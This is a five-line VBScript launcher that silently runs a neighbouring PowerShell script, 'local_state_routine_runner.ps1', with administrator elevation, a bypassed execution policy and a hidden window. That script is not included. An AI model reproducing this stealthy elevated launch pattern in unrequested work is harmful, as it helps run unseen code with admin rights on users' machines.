Set app = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
base = fso.GetParentFolderName(WScript.ScriptFullName)
args = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & base & "\local_state_routine_runner.ps1"""
app.ShellExecute "powershell.exe", args, base, "runas", 0
